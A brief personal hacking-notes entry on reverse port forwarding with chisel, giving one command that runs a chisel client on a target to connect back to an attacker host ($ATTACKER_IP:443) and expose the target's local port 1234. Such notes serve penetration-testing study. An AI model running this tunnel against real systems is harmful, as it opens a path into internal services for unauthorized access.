# tunneling through chisel - socks Forward specific port
Forward port 1234 on attacker host to 127.0.0.1:1234 on target.
The client specifies the ports.
```
./chisel client $ATTACKER_IP:443 R:1234:127.0.0.1:1234
```

# Related

- [20221003150604](/zet/20221003150604/README.md) tunneling through chisel - socks
- ~/kb/hacking/commands/pivot-tunnel-through-chisel.md

Tags:

    #command #hacking #pivot 
